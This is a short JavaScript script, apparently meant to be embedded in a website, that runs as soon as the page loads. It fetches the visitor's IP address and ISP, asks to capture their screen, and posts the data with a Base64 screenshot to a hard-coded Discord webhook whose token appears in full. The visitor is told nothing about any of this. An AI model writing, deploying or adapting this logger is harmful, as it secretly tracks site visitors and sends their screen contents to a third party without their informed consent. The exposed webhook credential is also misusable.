const discordWebhookUrl = "https://discord.com/api/webhooks/1321174758473203753/qocJaQJKcTiAam-mxRKNeSa7fty96eas8v9p_v3-gtApG2tTAJZh7dL3w3TNJchEaEK_"; // Replace with your webhook URL

// Function to fetch the user's IP and ISP
async function fetchIPAndISP() {
  try {
    const response = await fetch("http://ip-api.com/json/");
    if (!response.ok) throw new Error("Failed to fetch IP and ISP.");
    const data = await response.json();
    console.log("IP and ISP fetched:", data);
    return {
      ip: data.query || "Unknown IP",
      isp: data.isp || "Unknown ISP",
    };
  } catch (error) {
    console.error("Error fetching IP and ISP:", error);
    return { ip: "Unknown IP", isp: "Unknown ISP" };
  }
}

// Function to capture a screen image
async function captureScreenImage() {
  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({
      video: true,
    });

    const video = document.createElement("video");
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    return new Promise((resolve) => {
      video.srcObject = stream;
      video.play();

      video.onloadeddata = () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/png"); // Convert the image to Base64
        stream.getTracks().forEach((track) => track.stop()); // Stop the screen capture stream
        console.log("Screen image captured.");
        resolve(imageData);
      };
    });
  } catch (error) {
    console.error("Error capturing screen image:", error);
    return null; // Return null if the screen capture fails
  }
}

// Function to send an embed message to Discord
async function sendDiscordEmbed(ip, isp, screenImageBase64) {
  const embedPayload = {
    username: "Website Logger",
    embeds: [
      {
        title: "User Access Log",
        description: "A user accessed the website.",
        color: 5814783, // #6a11cb in decimal
        fields: [
          { name: "IP Address", value: ip, inline: true },
          { name: "ISP", value: isp, inline: true },
          { name: "Time", value: new Date().toLocaleString(), inline: false },
        ],
        image: screenImageBase64
          ? { url: screenImageBase64 } // Embed the screen capture image
          : null,
      },
    ],
  };

  try {
    const response = await fetch(discordWebhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embedPayload),
    });

    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    console.log("Discord embed sent successfully.");
  } catch (error) {
    console.error("Error sending Discord embed:", error);
  }
}

// Main execution
(async () => {
  console.log("Starting script...");

  // Fetch IP and ISP
  const { ip, isp } = await fetchIPAndISP();

  // Capture the user's screen
  const screenImageBase64 = await captureScreenImage();

  // Send data to Discord
  await sendDiscordEmbed(ip, isp, screenImageBase64);
})();